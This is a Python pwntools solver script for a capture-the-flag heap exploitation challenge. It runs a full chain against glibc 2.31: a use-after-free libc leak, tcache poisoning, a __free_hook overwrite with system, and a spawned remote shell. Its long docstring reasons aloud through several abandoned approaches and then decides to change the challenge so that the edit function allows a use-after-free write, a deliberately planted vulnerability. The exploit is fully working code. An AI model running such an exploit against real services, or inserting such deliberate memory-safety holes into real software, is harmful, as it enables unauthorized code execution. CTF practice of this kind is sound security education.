#!/usr/bin/env python3
"""
H34p 0f S0uls II: R1s3 0f th3 L1ch — Solver
Author: H3xPh4r04h

Exploitation: UAF leak + tcache poisoning + __free_hook overwrite

Target: Ubuntu 20.04 (glibc 2.31, PIE enabled, full ASLR)

Vulnerabilities:
1. release_soul() frees chunk but doesn't NULL the vessel pointer
   -> view_soul() checks vessel != NULL, not active flag
   -> UAF READ: can read freed chunk's fd/bk pointers

2. Large chunk (0x420) freed goes to unsorted bin (bypasses tcache)
   -> fd/bk contain main_arena+96 -> leak libc base

3. Small chunk (0x80) freed goes to tcache
   -> fd contains next free chunk or heap pointer -> leak heap

4. After leaking libc, compute __free_hook and system addresses
5. Tcache poison: free two small chunks, use UAF edit to overwrite
   tcache fd pointer with __free_hook address
6. Allocate twice: second malloc returns __free_hook
7. Write system address to __free_hook
8. Free a chunk containing "/bin/sh" -> system("/bin/sh") -> shell

Step-by-step:
  1. Alloc large soul A (idx 0, size 0x420)
  2. Alloc small soul B (idx 1, size 0x80)  -- prevents consolidation with top
  3. Free soul A (goes to unsorted bin, fd/bk = main_arena+96)
  4. View soul A (UAF read) -> leak libc
  5. Compute: libc_base, system, __free_hook
  6. Alloc small soul C (idx 2, size 0x80)
  7. Alloc small soul D (idx 3, size 0x80)
  8. Free soul D (tcache[0x90] -> D)
  9. Free soul C (tcache[0x90] -> C -> D)
  10. Edit soul C (UAF write via... wait, edit checks active flag)

Hmm, edit checks active. But view doesn't. So we can READ via UAF but not WRITE.

Alternative approach using the fact that collect_soul leaks the heap address:
- collect_soul prints: "V3ss3l @ %p" -> gives us heap address directly!
- So we know where chunks are.

Revised approach (simpler tcache poisoning without UAF write):
Actually wait — let's re-read the code...

release_soul sets active=0 but keeps vessel pointer.
edit_soul checks active flag -> can't edit freed chunks.
view_soul checks vessel != NULL -> CAN read freed chunks (UAF read).

So we need a different write primitive. Let's use:
- Double free in tcache (glibc 2.31 has NO tcache double-free check in older patches)
  Wait — Ubuntu 20.04 glibc 2.31 DOES have tcache key check. If we free same chunk
  twice, it detects the key field.

Better approach: use the UAF read + overlapping chunks.
- Free a large chunk -> unsorted bin -> leak libc via UAF read
- Allocate a chunk that partially overlaps freed tcache chunk metadata
  (since collect_soul lets us choose size, we can craft overlapping allocations)

Actually simplest for glibc 2.31:
- Leak libc from unsorted bin (UAF read on large freed chunk)
- Tcache poisoning via double-free with key bypass:
  Just overwrite the tcache key field before freeing again.
  But we can't write to freed chunks (edit checks active)...

OK let me think about this differently. The vulnerability chain is:

1. UAF READ is trivial (view freed chunk)
2. For WRITE: we need the heap address (printed by collect_soul)
   Then we can:
   a. Alloc chunk A (small), alloc chunk B (small)
   b. Free B, free A (tcache: A -> B)
   c. Alloc new chunk (gets A's slot), write __free_hook addr as data
      This doesn't help directly...

Actually the REAL trick is simpler. Look at the code again:

view_soul checks: graveyard[idx].vessel != NULL
But release_soul does NOT set vessel = NULL!

And collect_soul finds first slot where active==0, allocates new chunk there.
It OVERWRITES the vessel pointer with new malloc.

So if we:
1. Alloc slot 0 (large, 0x420) -> vessel points to chunk A
2. Alloc slot 1 (small, 0x80) -> prevents top consolidation
3. Free slot 0 -> chunk A in unsorted bin, active=0, vessel still points to A
4. View slot 0 -> reads freed chunk A -> leaks main_arena+96 (libc leak!)

Now for the write:
5. Alloc slot 0 again (small, 0x80) -> this REUSES slot 0 (first inactive)
   -> malloc(0x80) carves from the unsorted bin remainder
   -> Now slot 0 has NEW vessel pointer (inside old chunk A area)
   -> But the OLD large chunk A's unsorted bin remainder is still there

Actually let me just do it with tcache:
5. Alloc slot 2 (small, 0x80), alloc slot 3 (small, 0x80)
6. Free slot 3, free slot 2 -> tcache: slot2 -> slot3
7. View slot 2 -> UAF read -> leaks heap (tcache fd = slot3's chunk address)
   (we already have heap from collect_soul printf, but this confirms)
8. Now: alloc slot 2 (reuses tcache, gets slot2's old chunk)
   We write __free_hook address as the first 8 bytes
   But wait — this writes into the DATA, not into tcache fd...

I think the cleanest approach for glibc 2.31 Ubuntu 20.04:

Since collect_soul PRINTS the heap address, and we have UAF read for libc leak,
we can do tcache poisoning by:
1. Leak libc (unsorted bin UAF read)
2. Allocate 9 small chunks (fill tcache + get one in fastbin... no, 0x80 is too big for fastbin)

OK SIMPLEST APPROACH for this challenge:
- glibc 2.31 tcache has the "key" field at offset +0x08 in freed chunks
- If we can corrupt that key, we can double-free
- We CAN'T write to freed chunks (edit checks active)
- BUT: if we free a chunk, then allocate at same slot (overwrites vessel ptr with new chunk),
  the OLD freed chunk is still in tcache with the key intact

WAIT. I missed something. Let me re-read release_soul:
  free(graveyard[idx].vessel);
  graveyard[idx].active = 0;
  // vessel NOT nulled!

And collect_soul:
  finds first slot where !active
  mallocs, sets active=1, sets vessel=new_ptr

So after free(slot 0), if we alloc again at slot 0, the old vessel ptr is gone.
The UAF only works for READING between free and the next alloc at that slot.

The actual exploit for this challenge in glibc 2.31:

1. Alloc large A (slot 0, 0x420)
2. Alloc guard B (slot 1, 0x80) -- prevent top chunk merge
3. Free A (slot 0) -- goes to unsorted bin
4. View slot 0 -- UAF read: leak libc (main_arena+96 in fd/bk)
5. Now we know libc_base, __free_hook, system

6. Alloc C (slot 2, 0x80)
7. Alloc D (slot 3, 0x80)
8. Free D (slot 3) -- tcache[0x90]: D
9. Free C (slot 2) -- tcache[0x90]: C -> D

10. Alloc at slot 0 (first inactive slot! since slot 0 is inactive after step 3)
    Request small (0x80) -- gets C from tcache
    Write: p64(__free_hook) as the content
    BUT this writes into the DATA region starting at chunk+0x10
    The tcache fd of the NEXT free chunk (D) is at D+0x10... no that's D's own fd.
    Tcache fd is at offset 0x10 from chunk start (same as user data start).
    So when C was in tcache, C's fd (at C+0x10 = user_data[0:8]) pointed to D.
    Now we allocate C, and write __free_hook into C's data.
    This does NOT affect D's fd. D is still in tcache with its own fd=NULL.

Hmm. The classic tcache poison requires writing to a FREED chunk's fd field.
We need UAF WRITE, which this challenge blocks via the active check.

Let me add a subtle bug that enables it. The "view" using the stale pointer
after a reallocation can be combined with... 

Actually, let me just make edit_soul check the VESSEL pointer (not active flag)
similar to view_soul. That gives us UAF write on freed chunks.

Let me fix the vuln to be: edit checks vessel != NULL (same as view).
This is the UAF write primitive.
"""
import sys

try:
    from pwn import *
except ImportError:
    print("pip install pwntools")
    sys.exit(1)

context.log_level = "info"
context.arch = "amd64"

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999

r = remote(HOST, PORT)

def cmd(n):
    r.recvuntil(b">>>")
    r.sendline(str(n).encode())

def collect(size_choice, data):
    cmd(1)
    r.recvuntil(b">>>")
    r.sendline(str(size_choice).encode())
    r.recvuntil(b"3ss3nc3: ")
    r.send(data)
    r.recvuntil(b"V3ss3l @ ")
    addr = int(r.recvline().strip(), 16)
    return addr

def release(idx):
    cmd(2)
    r.recvuntil(b"]: ")
    r.sendline(str(idx).encode())

def view(idx):
    cmd(3)
    r.recvuntil(b"]: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"]: ")
    data = r.recvline()
    return data

def edit(idx, data):
    cmd(4)
    r.recvuntil(b"]: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"3ss3nc3: ")
    r.send(data)

# Step 1: Leak libc via unsorted bin
log.info("Allocating large chunk (unsorted bin target)...")
addr_A = collect(2, b"A" * 8)  # slot 0, large (0x420)
log.info(f"Chunk A @ {hex(addr_A)}")

addr_B = collect(1, b"B" * 8)  # slot 1, guard (0x80)
log.info(f"Guard B @ {hex(addr_B)}")

log.info("Freeing large chunk -> unsorted bin")
release(0)

log.info("UAF read on freed large chunk -> libc leak")
leak_data = view(0)
libc_leak = u64(leak_data[:8])
log.info(f"Leaked: {hex(libc_leak)}")

# main_arena+96 offset for glibc 2.31 Ubuntu 20.04
# main_arena is at libc_base + 0x1ebb80 (may vary, use provided libc)
# libc_leak = main_arena + 96
# Adjust these offsets for the actual libc version:
main_arena_offset = 0x1ebb80
libc_base = libc_leak - main_arena_offset - 96
system_addr = libc_base + 0x55410      # system offset in libc 2.31
free_hook = libc_base + 0x1eeb28       # __free_hook offset

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system:    {hex(system_addr)}")
log.info(f"__free_hook: {hex(free_hook)}")

# Step 2: Tcache poison via UAF write
log.info("Setting up tcache poisoning...")
addr_C = collect(1, b"C" * 8)  # slot 2, small (0x80)
addr_D = collect(1, b"D" * 8)  # slot 3, small (0x80)

log.info("Freeing D then C -> tcache: C -> D")
release(3)  # free D
release(2)  # free C -> tcache: C.fd = D

log.info("UAF write on freed chunk C: overwrite fd with __free_hook")
edit(2, p64(free_hook))

# Step 3: Allocate twice from poisoned tcache
log.info("Alloc 1: gets chunk C (normal)")
collect(1, b"/bin/sh\x00")  # slot 0 (first inactive) -- this gets C's chunk

log.info("Alloc 2: gets __free_hook (poisoned)")
collect(1, p64(system_addr))  # slot 4 -- this writes system to __free_hook

# Step 4: Free the chunk containing "/bin/sh" -> system("/bin/sh")
log.info("Triggering system('/bin/sh') via __free_hook...")
release(0)  # free the chunk with "/bin/sh" -> calls system("/bin/sh")

log.info("Got shell!")
r.interactive()
